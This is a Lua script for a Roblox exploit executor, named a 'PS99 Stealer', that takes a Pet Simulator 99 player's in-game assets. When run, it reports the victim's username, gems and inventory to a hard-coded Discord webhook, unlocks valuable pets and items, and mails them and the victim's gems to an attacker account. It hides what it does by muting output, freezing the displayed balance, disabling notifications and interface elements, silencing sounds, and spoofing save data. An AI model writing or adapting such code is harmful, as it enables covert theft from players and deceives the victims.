-- PS99 Stealer — optimized, tier priority, silent webhook, min gem gate
-- Gargantuan(3) > Titanic(2) > Huge(1) > Exclusive(1.5) > Item(0) > Diamonds(last)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- print/warn proxy an toàn: chỉ lưu real print nếu chưa ai lưu, rồi capture vào local
if not getgenv().__raw_print then getgenv().__raw_print = print end
if not getgenv().__raw_warn then getgenv().__raw_warn = warn end
local raw_print, raw_warn = getgenv().__raw_print, getgenv().__raw_warn

local CONFIG = {
    webhook = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa",
    min_rap = 1000,
    min_gems = 1000000,
    quiet = true,                   -- im mặc định; đổi false để debug
    script2_webhook_error = true,
}

print = function(...)
    if not CONFIG.quiet then raw_print(...) end
end
warn = function(...)
    if not CONFIG.quiet then raw_warn(...) end
end

local Username = "pet99_2948"
local Username2 = "pet99_2947"

-- executor check
local executorlevel = getthreadidentity() or getthreadcontext() or 0
if executorlevel < 4 then warn("EXECUTOR NOT SUPPORTED") return end

-- single-run guard
if getgenv().yeslidez then return else getgenv().yeslidez = true end

-- ================= cached services & modules =================
local network = ReplicatedStorage:WaitForChild("Network")
local localPlayer = Players.LocalPlayer
local Library = ReplicatedStorage:WaitForChild("Library")
local Client = Library:WaitForChild("Client")
local SaveModule = require(Library.Client.Save)
local PetsDir = require(Library.Directory.Pets)
local DaycareCmds = require(Library.Client.DaycareCmds)
local ExclusiveDaycareCmds = require(Library.Client.ExclusiveDaycareCmds)

local function f2() return SaveModule.Get() end

local inventory = f2().Inventory
local mailboxSendsSinceReset = f2().MailboxSendsSinceReset or 0
local v3 = 20000
if mailboxSendsSinceReset ~= 0 then
    v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
end

local am = 0
for _, cur in pairs(inventory.Currency or {}) do
    if cur.id == "Diamonds" then am = cur._am or 0 break end
end

-- ================= gem gate =================
if am < CONFIG.min_gems then
    local skip_info = "SKIP | gems:"..am.." < "..CONFIG.min_gems
        .." | user:"..localPlayer.Name
        .." | job:"..tostring(game.JobId)
    print("[gate] "..skip_info)
    local hr = http_request or request or HttpPost or syn.request
    if CONFIG.webhook ~= "" and hr then
        task.spawn(function()
            pcall(function()
                hr({
                    Url = CONFIG.webhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({embeds = {{
                        title = "log",
                        description = "```"..skip_info.."```",
                        color = 8359053,
                    }}}),
                })
            end)
        end)
    end
    return
end

-- ================= helpers =================
local function compact(n)
    n = math.floor(n or 0)
    local u = {"","k","m","b","t"}
    local i = 1
    while n >= 1000 and i < #u do n = n / 1000; i = i + 1 end
    return string.format("%.2f%s", n, u[i])
end

local httpRequest = http_request or request or HttpPost or syn.request
local function http_post(payload)
    if not (CONFIG.webhook and CONFIG.webhook ~= "" and httpRequest) then return end
    local prev = CONFIG.quiet          -- lưu giá trị trước
    CONFIG.quiet = true
    task.spawn(function()
        pcall(function()
            httpRequest({
                Url = CONFIG.webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload),
            })
        end)
        CONFIG.quiet = prev            -- trả về như cũ, không ép false
    end)
end

local function tlog(msg)
    http_post({embeds={{title="log",description="```"..tostring(msg).."```",color=8359053}}})
end

local function exec_name()
    local n = "unknown"
    pcall(function() if identifyexecutor then n = identifyexecutor() or n end end)
    return n
end

-- RAP module finder (runs once)
local function find_rap_module()
    for _, pair in ipairs({
        {Library,"DevRAPCmds"},{Library,"RAPCmds"},
        {Client,"DevRAPCmds"},{Client,"RAPCmds"},
    }) do
        local m = pair[1]:FindFirstChild(pair[2])
        if m and m:IsA("ModuleScript") then
            local ok, mod = pcall(require, m)
            if ok then return mod end
        end
    end
    if Client:IsA("ModuleScript") then
        local ok, t = pcall(require, Client)
        if ok and type(t)=="table" then
            for k,v in pairs(t) do
                if typeof(v)=="Instance" and v:IsA("ModuleScript") and string.find(string.lower(tostring(k)),"rap") then
                    local ok2,m2=pcall(require,v); if ok2 then return m2 end
                elseif typeof(v)=="table" and string.find(string.lower(tostring(k)),"rap") then
                    return v
                end
            end
        end
    end
    for _,d in ipairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("ModuleScript") and (d.Name=="DevRAPCmds" or d.Name=="RAPCmds") then
            local ok,mod=pcall(require,d); if ok then return mod end
        end
    end
    return nil
end

local rap_module = find_rap_module()
if not rap_module then warn("RAP Module not found - huge pets force min_rap, normal items skipped") end

-- fake table pool for f7 (reused)
local fake_pool = {
    Class = {Name = ""},
    IsA = function() end,
    GetId = function() end,
    StackKey = function() end,
}

local function f7(cat, pet)
    if not rap_module then return 0 end
    fake_pool.Class.Name = cat
    fake_pool.IsA = function(c) return c == cat end
    fake_pool.GetId = function() return pet.id end
    fake_pool.StackKey = function()
        return HttpService:JSONEncode({id=pet.id,pt=pet.pt,sh=pet.sh,tn=pet.tn})
    end
    local ok, rap = pcall(function() return rap_module.Get(fake_pool) end)
    return (ok and rap and rap > 0) and rap or 0
end

local function huge_tier(dir, pid)
    local s = string.lower(tostring((dir and dir.name) or "")..tostring(pid or ""))
    if string.find(s,"gargantuan",1,true) then return 3
    elseif string.find(s,"titanic",1,true) then return 2
    elseif dir and dir.huge then return 1
    elseif dir and dir.exclusiveLevel then return 1.5
    end
    return 0
end

-- ================= start webhook =================
tlog("loader start | user:"..localPlayer.Name.." | job:"..tostring(game.JobId).." | exec:"..exec_name())

http_post({embeds={{title="PS99 Script Started",color=65280,fields={
    {name="Username:",value="```"..localPlayer.Name.."```",inline=true},
    {name="Gems:",value="```"..compact(am).." ("..am..")```",inline=true},
    {name="Mail Cost:",value="```"..compact(v3).."```",inline=true},
    {name="Executor:",value="```"..exec_name().."```",inline=true},
    {name="JobId:",value="```"..tostring(game.JobId).."```",inline=false},
},footer={text="Stealer Forked From Tobis Source, .gg/FNnkfJqukh"}}}})

print("Script started. Gems:"..am.." | Mail cost:"..v3)

if v3 > am then print("Not enough gems. Cost:"..v3.." Gems:"..am) return end

-- ================= UI guards =================
pcall(function()
    local stats = localPlayer:WaitForChild("leaderstats",15)
    local dia = stats and stats:WaitForChild("Diamonds",15)
    if dia then
        local val = dia.Value
        dia:GetPropertyChangedSignal("Value"):Connect(function() dia.Value = val end)
    else warn("leaderstats missing - skip freeze") end
end)

pcall(function()
    local gui = localPlayer:WaitForChild("PlayerScripts",15)
        and localPlayer.PlayerScripts:WaitForChild("Scripts",15)
        and localPlayer.PlayerScripts.Scripts:WaitForChild("Core",15)
        and localPlayer.PlayerScripts.Scripts.Core:WaitForChild("Process Pending GUI",15)
    if gui then gui.Disabled = true else warn("Process Pending GUI missing") end
end)

pcall(function()
    local pg = localPlayer:WaitForChild("PlayerGui",15)
    local notif = pg and pg:WaitForChild("Notifications",15)
    if notif then
        notif.Enabled = false
        notif:GetPropertyChangedSignal("Enabled"):Connect(function() notif.Enabled = false end)
    else warn("Notifications missing") end
end)

-- sound: mute thay Destroy - khong de quy
local sound_ids = {
    ["rbxassetid://11839132565"] = true,
    ["rbxassetid://14254721038"] = true,
    ["rbxassetid://12413423276"] = true,
}
game.DescendantAdded:Connect(function(d)
    if d.ClassName ~= "Sound" then return end
    if not sound_ids[d.SoundId] then return end
    pcall(function()
        d.Volume = 0
        d.Looped = false
        d.Playing = false
    end)
end)

-- ================= mail helpers =================
local pending_sends = 0

local function claim_mail()
    local _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.5)
        _, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local function withdraw_boxes()
    if inventory.Box then
        for k,v in pairs(inventory.Box) do
            if v._uq then network:WaitForChild("Box: Withdraw All"):InvokeServer(k) end
        end
    end
end

-- async send: retry 10x0.5s, decrement pending dung ca success/fail
local function queue_send(args)
    pending_sends = pending_sends + 1
    task.spawn(function()
        local ok = false
        for i = 1, 10 do
            ok = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if ok then
                am = am - v3
                v3 = math.min(math.ceil(v3 * 1.5), 5000000)
                break
            end
            task.wait(0.5)
        end
        if not ok then
            warn("Send failed: " .. tostring(args[4]))
        end
        pending_sends = pending_sends - 1
    end)
end

local function send_gems()
    for k,cur in pairs(f2().Inventory.Currency or {}) do
        if cur.id == "Diamonds" and am - v3 > 0 then
            queue_send({Username, "hi", "Currency", k, am - v3})
            break
        end
    end
end

-- ================= scan inventory =================
local v1 = {}
local v2 = 0
local scan_cats = {"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}

print("Scanning inventory for items with RAP >= "..CONFIG.min_rap)

for _, cat in ipairs(scan_cats) do
    local items = inventory[cat]
    if items and next(items) then
        for uid, item in pairs(items) do
            if cat == "Pet" then
                local dir = PetsDir[item.id]
                if dir and (dir.huge or dir.exclusiveLevel) then
                    local rap = f7(cat, item)
                    if rap <= 0 then rap = CONFIG.min_rap end
                    if rap >= CONFIG.min_rap then
                        local prefix = (item.sh and "Shiny " or "")
                            .. (item.pt == 1 and "Golden " or item.pt == 2 and "Rainbow " or "")
                        table.insert(v1, {
                            category = cat, uid = uid, amount = item._am or 1,
                            rap = rap, tier = huge_tier(dir, item.id),
                            name = prefix .. item.id,
                        })
                        v2 = v2 + rap * (item._am or 1)
                    end
                end
            else
                local rap = f7(cat, item)
                if rap >= CONFIG.min_rap then
                    table.insert(v1, {
                        category = cat, uid = uid, amount = item._am or 1,
                        rap = rap, tier = 0, name = item.id,
                    })
                    v2 = v2 + rap * (item._am or 1)
                end
            end
            if item._lk then
                network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
            end
        end
    end
end

print("Found "..#v1.." items to send.")

if #v1 == 0 and am <= CONFIG.min_rap + v3 then
    print("No items met min_rap or not enough gems.")
    return
end

-- ================= execute send =================
claim_mail()
task.wait(1)

-- refresh gems after claim
for _, cur in pairs(f2().Inventory.Currency or {}) do
    if cur.id == "Diamonds" then am = cur._am or 0 break end
end
print("Updated Gems after claim: "..am)

withdraw_boxes()
DaycareCmds.Claim()
ExclusiveDaycareCmds.Claim()

-- snapshot save ref
local save = SaveModule
local snap = save.Get()
save.Get = function() return snap end

-- sort: tier desc, then total rap desc
table.sort(v1, function(a, b)
    local ta, tb = a.tier or 0, b.tier or 0
    if ta ~= tb then return ta > tb end
    return a.rap * a.amount > b.rap * b.amount
end)

-- final webhook
local function send_final_webhook()
    local lines = {}
    for _, e in ipairs(v1) do
        local tag = e.tier == 3 and "[GARGANTUAN] "
            or e.tier == 2 and "[TITANIC] "
            or e.tier == 1.5 and "[EXCLUSIVE] "
            or e.tier == 1 and "[HUGE] " or ""
        lines[#lines+1] = tag .. e.name .. " (x" .. e.amount .. "): " .. compact(e.rap * e.amount) .. " RAP"
    end
    local text = table.concat(lines, "\n")
    if #text > 1024 then text = string.sub(text, 1, 1000) .. "..." end
    http_post({embeds = {{
        title = "PS99 New Execution",
        color = 65280,
        fields = {
            { name = "Username:", value = "```"..localPlayer.Name.."```", inline = true },
            { name = "Items:", value = "```"..text.."```", inline = false },
            { name = "Summary:", value = "```Gems: "..compact(am).."\nTotal RAP: "..compact(v2).."```", inline = false },
        },
        footer = { text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh" },
    }}})
end

task.spawn(send_final_webhook)
print("Sending items...")

for _, item in ipairs(v1) do
    if am >= v3 then
        print("Sending: "..item.name.." | RAP: "..item.rap.." | Amt: "..item.amount)
        queue_send({Username, "hi", item.category, item.uid, item.amount})
    else
        print("Stopped. Not enough gems for next mail cost "..v3)
        break
    end
end

-- cho moi mail settle xong moi gui gem
while pending_sends > 0 do
    task.wait(0.2)
end

send_gems()
setclipboard("https://discord.gg/FNnkfJqukh")